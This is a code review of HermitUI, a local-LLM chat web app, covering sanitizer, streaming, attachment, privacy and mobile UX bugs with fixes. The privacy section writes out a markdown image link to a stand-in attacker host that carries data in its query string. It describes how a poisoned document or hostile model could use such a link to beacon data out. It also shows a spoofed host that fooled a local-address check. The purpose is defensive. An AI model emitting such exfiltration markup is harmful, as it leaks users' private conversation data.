# HermitUI Code Review — 2026-07-24 (v0.9.1, HEAD `80cb07b`)

Full read of `src/index.html`, `src/style.css`, `src/script.js`, `build.py`, and `tests/`.
Findings verified against the pinned libraries in `libs/` and by running the pure logic
through `tests/extract.mjs` where possible. Ordered by what matters for a public release.

Baseline checks that passed: `node tests/run.mjs` → 48/48. `dist/hermit-ui-standalone.html`,
`dist/hermit-ui-wllama.html` and root `index.html` are byte-in-sync with `src/`.

---

## 1. Correctness bugs

### 1.1 KaTeX's `<annotation>` is unwrapped by the sanitizer — **severity corrected after testing**

> **Correction.** This was first written up as "math renders with its LaTeX source printed
> beside it — highest impact". The sanitizer analysis below is confirmed exactly as stated,
> but the predicted *visible* symptom does not reproduce: Chromium does not paint the
> orphaned text node. Measured on the real build — with the fix the painted output is
> `Einstein: 𝐸=𝑚𝑐² done.`, and **without** it, it is the same. The DOM differs; the screen
> does not. The fix is kept because the unfixed DOM is out of spec and its rendering is left
> to each browser's tolerance for stray MathML text, but this is hardening, not a
> ship-blocker. `tests/e2e_rendering.py` asserts on `innerText` for exactly this reason.


`src/script.js:49` (`renderMathTex`) → `src/script.js:2040` (sanitize).

KaTeX 0.16.47 in `output: 'mathml'` mode emits:

```html
<span class="katex"><math xmlns="…">
  <semantics><mrow>…</mrow>
    <annotation encoding="application/x-tex">E=mc^2</annotation>
  </semantics>
</math></span>
```

Verified in `libs/katex.js`: `new Ct("annotation",[new qt(t)])` … `new Ct("semantics",[i,l])`,
with the `o?"katex":"katex-mathml"` branch confirming the mathml-only wrapper.

DOMPurify 3.4.12's default `ALLOWED_TAGS` is `[...html, ...svg, ...svgFilters, ...mathMl, ...text]`
— verified in `libs/dompurify.js` as `et=M({},[...F,...H,...j,...G,...Y])`, where `G` is the
mathMl list that ends at `mprescripts`. `semantics` and `annotation` are **not** in it; they live
in the separate `mathMlDisallowed` set (`W`), which is only used for namespace validation.

Neither tag is in the default `FORBID_CONTENTS` (`annotation-xml` is; plain `annotation` is not),
and `KEEP_CONTENT` defaults to `true`. So the sanitizer unwraps both elements and the raw TeX
survives as a bare text node inside `<math>`.

**Result:** the DOM becomes `<math><mrow>…</mrow>E=mc^2</math>` — the TeX outside any
`<annotation>`, directly inside `<math>`, which no spec accounts for. Chromium does not paint
it (measured), so there is no visible defect there; a browser that renders stray MathML text
would show it.

**Fix** — allow the two inert MathML wrapper tags wherever AI markdown is sanitized:

```js
// near the other constants
const AI_SANITIZE = { ADD_TAGS: ['semantics', 'annotation'] };

// script.js:2040
domSeg.el.innerHTML = DOMPurify.sanitize(marked.parse(seg.content), AI_SANITIZE);
// script.js:2771
contentDiv.innerHTML = DOMPurify.sanitize(text, AI_SANITIZE);
```

Both must be allowed — permitting only `semantics` still leaks the annotation text.
Verify with `$E=mc^2$` and `$$\int_0^1 x^2\,dx$$`.

### 1.2 `temperature: 0` silently becomes 0.7 on the wllama backend

`src/script.js:2439` — `const temperature = payload.temperature || 0.7;`

Greedy decoding is the single most common non-default temperature. `0 || 0.7` → `0.7`.

**Fix:** `payload.temperature ?? 0.7`.

### 1.3 A backend that doesn't stream produces silent nothing

`src/script.js:2532` — `processLine` ignores any line not starting with `data:`.

* A proxy that buffers, or a server that ignores `stream: true`, returns one plain JSON body.
  Zero chunks are emitted → `onDone(0, 0)` → `onFinal` removes the empty bubble
  (`script.js:2727`). The user clicks Send and **literally nothing happens** — no text, no error.
* `{"error": …}` frames streamed mid-generation are parsed fine, have no `choices`, and are
  dropped. Both llama.cpp and LM Studio emit these (e.g. on KV-cache exhaustion), so a context
  overflow partway through a reply reads as a truncated answer with no explanation.

**Fix:** in `processLine`, raise on `data.error`; after the read loop, if nothing was ever
emitted, try parsing the accumulated buffer as a non-streaming completion
(`choices[0].message.content`) before reporting an empty result.

### 1.4 Attachments and context text are dropped *and cleared* when the pane is collapsed

`src/script.js:2597` gates on `isPaneVisible`; `src/script.js:2675`–`2688` clears unconditionally.

Attach a file (or type into the context box) → click 📎 to collapse the pane → send. The
attachment never reaches the model, and the chip and text are wiped anyway. No warning.

**Fix:** drop `isPaneVisible` from the gate — the chips and text still exist regardless of
whether the pane is showing. Failing that, only clear what was actually sent.

### 1.5 `isTextFile` rejects almost every source file

`src/script.js:491`. Accepted: `.json .js .py .md .html .css .txt .csv .xml .yml .yaml .sh`.

Rejected: `.ts .tsx .jsx .rs .go .java .c .cpp .h .hpp .rb .php .sql .toml .ini .cfg .conf
.log .env .kt .swift .vue .svelte .scss .diff .patch`, `Dockerfile`, `Makefile`.

Worse: `.ts` maps to `video/mp2t` in most OS MIME tables, so it fails `isImageFile` too and
the user is told *"does not appear to be a text or image file"*. Verified against the shipped
function.

For a tool aimed at local-LLM users this is a bad first interaction. **Fix:** expand the
extension list, keep the "no MIME type and under the size cap → try reading as text" fallback
in mind, and update the `accept=` attribute in `src/index.html:254` to match.

### 1.6 `parseThinkSegments` eats a trailing `<` on the *final* render too

`src/script.js:1915`–`1928`. Verified: `"x <"` → `"x "`, `"use <t"` → `"use "`, `"5 </"` → `"5 "`.

Suppressing a half-arrived tag is correct while streaming and wrong once the message is
complete. History and export keep the character; only the screen loses it.

**Fix:** `parseThinkSegments(rawText, isFinal)`, skip the partials loop when `isFinal`.

### 1.7 `finish_reason: "length"` is never surfaced

A reply cut off at `max_tokens` (or at the wllama 4096 default) looks complete. Capture
`data.choices[0].finish_reason` in `processLine` and render a badge when it is `"length"`.

---

## 2. Privacy — the headline claim

### 2.1 Only 14 hard-coded domains trigger the cloud warning

`src/script.js:370`. `api.novita.ai`, `deepinfra.com`, `hyperbolic.xyz`, `sambanova.ai`,
`siliconflow.cn`, `integrate.api.nvidia.com`, `moonshot.cn` — none produce a banner. Confirmed:
`detectCloudProvider("https://evil.example.com/v1")` → `null`.

Compounding it, `#api=` can repoint the app from a shared link (`script.js:2916`) behind only a
2.5-second toast.

**Fix:** invert the test. Warn for anything that is not `localhost` / `127.0.0.0/8` / `::1` /
`10.*` / `192.168.*` / `172.16–31.*` / `*.local`. Keep the named list purely to label *which*
provider it is. This is both more honest and future-proof.

### 2.2 Remote images in AI markdown are a live outbound channel

`![](https://evil.example/p.png?d=…)` in a model reply fetches on render. For an app whose
first claim is "nothing leaves your machine", a poisoned document in context or a hostile model
can beacon out.

**Options:** a DOMPurify `afterSanitizeAttributes` hook that blanks non-`data:`/`blob:` image
sources behind a click-to-load placeholder, or a `<meta>` CSP with `img-src 'self' data: blob:`.
Trade-off: legitimate remote images in markdown stop rendering. Worth stating the choice in the
README either way.

### 2.3 AI links open in the same tab

One click on a model-generated link navigates away and destroys the unrecoverable session.
Add `target="_blank" rel="noopener noreferrer"` to anchors via a DOMPurify hook.

### 2.4 `#key=` leaves the API key in the address bar and history

`src/script.js:2930` warns via toast. Consider `history.replaceState` to strip the fragment once
applied — trade-off is that reload no longer reapplies the config.

### 2.5 API-key field invites password managers

`src/index.html:183` — `type="password"` with no `autocomplete="off"`.

---

## 3. Public-demo UX — the Reddit link will be opened on phones

### 3.1 No media queries anywhere, and the header cannot wrap

* `.header-center` is `position: absolute; left: 50%` (`style.css:87`), sitting on top of
  `.header-left` (title + version badge + `🤖 local-model @ http://localhost:1234`) and six
  icon buttons. At 390 px these overlap and overflow.
* `.inline-stats` (`style.css:579`) is ~500 px of monospace with no `flex-wrap`.
* `.msg-wrapper` spends 80 px on horizontal padding + 44 px avatar + 24 px gap out of 390
  (`style.css:183`).

Fluid fixes that stay inside the project's "avoid media queries" rule: `flex-wrap: wrap` on
`header` and `.inline-stats`, make `.header-center` an ordinary flex child, and
`padding: clamp(12px, 4vw, 24px) clamp(12px, 5vw, 40px)` on `.msg-wrapper`.

### 3.2 `height: 100vh` on `body`

`style.css:21`. On mobile Safari/Chrome the URL bar pushes the composer below the fold.
Add `height: 100dvh` after the existing `100vh` line (which stays as the fallback).

### 3.3 No `beforeunload` guard

Refresh or an accidental Ctrl+W destroys everything by design, with no prompt. One guarded
handler when `messages` contains a non-system entry.

### 3.4 New Chat has no confirmation and does not clear the composer

`src/script.js:1395`. Ctrl+Shift+O is one keystroke from wiping an unrecoverable chat. The
draft text, context-pane text and file chips also survive into the "new" chat. The import flow
already has exactly the right modal to reuse.

### 3.5 Mac users get no shortcuts

`src/script.js:669` checks `ctrlKey` only — add `metaKey`. The shortcuts also fire while
typing: Ctrl+E inside the System Prompt textarea triggers Export. Guard on `e.target` being an
input/textarea (excluding the composer).

### 3.6 Dark mode never sets `color-scheme`

Native scrollbars, number-input spinners and the file picker stay light.
`:root[data-theme="dark"] { color-scheme: dark; }`.

### 3.7 Mixed content from the hosted demo

On `https://moooff.github.io/…`, `http://192.168.x.x:1234` is blocked by the browser
(`localhost` is exempt, LAN IPs are not) and surfaces as the generic *"make sure your local
server is running and CORS is enabled"*. Detect
`location.protocol === 'https:' && /^http:\/\//.test(API_URL)` on a non-loopback host and say so
explicitly. This will come up on Reddit.

---

## 4. Smaller items

| # | Item | Location |
|---|---|---|
| 4.1 | **Summarize doesn't reduce context.** Summaries are filtered out of every payload, so the button never helps with the model's window. An "apply summary → replace history" action would. | `script.js:2698` |
| 4.2 | Re-picking the same GGUF doesn't fire `change` (`.value` never reset after load), so reloading the same model needs picking a different file first. | `script.js:1122` |
| 4.3 | Debug console log grows unbounded — cap the line count. | `script.js:2188` |
| 4.4 | Toast is not announced to screen readers — add `role="status"`. | `script.js:1404` |
| 4.5 | Infinite animations ignore `prefers-reduced-motion` (`formGlow`, `thinkGlow`, `blink`, `pb-indeterminate`). | `style.css` |
| 4.6 | Streaming re-parses the whole growing segment every 80 ms — Markdown + Highlight.js over the full text each tick is O(n²) on long answers with many code blocks. | `script.js:2039` |
| 4.7 | ~~Regenerate after a summary desyncs DOM order from `messages` order.~~ **Withdrawn** — re-checked: both append at the end (`chatbox.appendChild` and `messages.push`), so the orders match. No defect. | — |
| 4.8 | `apiEndpoint` with a base ending `/models` yields `/models/chat/completions`. User error, but a one-line guard is cheap. | `script.js:1464` |
| 4.9 | Mermaid `<style>` is re-allowed by the sanitizer; `classDef`/`style` directives can emit `url()` in the generated CSS. Low severity, worth a look given the privacy framing. | `script.js:167` |
| 4.10 | `BASE_PROMPT` bakes in the load-time date. Importing yesterday's export restores a stale date and flips the persona dropdown to "⚡ Custom" because the prompt no longer matches a preset. | `script.js:232`, `417` |
| 4.11 | Image reads decrement `pendingFileReads` in `finally`, text reads in `onload`/`onerror` — a read aborted another way leaks the counter and blocks submit. | `script.js:565` |

---

## 5. What's solid

Worth stating plainly, because it's unusual for a project this size:

* **Build integrity.** SRI hashes drive both the download *and* the verification; cached files
  are re-verified on every build; unbalanced `@wllama` markers fail loudly; `</script>` is
  escaped and a literal `</style` is rejected. `sub_required` / `replace_required` mean a drifted
  CDN tag fails instead of silently emitting a "standalone" file with live CDN links.
* **`MemBlob`** and the **`getResponse` patch** are both correct, and the comments explaining
  *why* they exist are exactly the right length.
* **uid-based Edit/Regenerate** instead of counting DOM nodes.
* **The export/import format** and the test suite around it, including the deliberately asserted
  truncation limits.
* **Ephemerality holds.** No `localStorage`, `IndexedDB`, or cookies anywhere in `src/`.

---

## 6. Status

All findings above were implemented in one pass, except:

* **§1.1** — implemented, but reclassified from ship-blocker to hardening after the browser
  test contradicted the predicted symptom (see the correction note there).
* **§4.1** (Summarize doesn't reduce context) — **not implemented.** This is a feature, not a
  defect: it changes what the conversation model means, so it wants a design decision rather
  than a patch. Left in the backlog.
* **§4.6** (O(n²) streaming re-render) — **not implemented.** Needs measurement before it is
  worth restructuring the render loop; the obvious fixes trade away visual fidelity mid-stream.
* **§4.7** — withdrawn, no defect.

Verification: `node tests/run.mjs` (180 assertions), `benchmark/.venv/bin/python
tests/e2e_export_import.py` (22), and a new `tests/e2e_rendering.py` (23) covering the DOM
paths the unit tests structurally cannot reach.

One test caught a bug in a fix: the first version of `isLocalEndpoint` matched the private
IPv4 ranges as string prefixes, so `192.168.1.20.evil.com` classified as local and would have
suppressed the very warning §2.1 exists to add. The private-range tests now run only against a
real IPv4 literal.
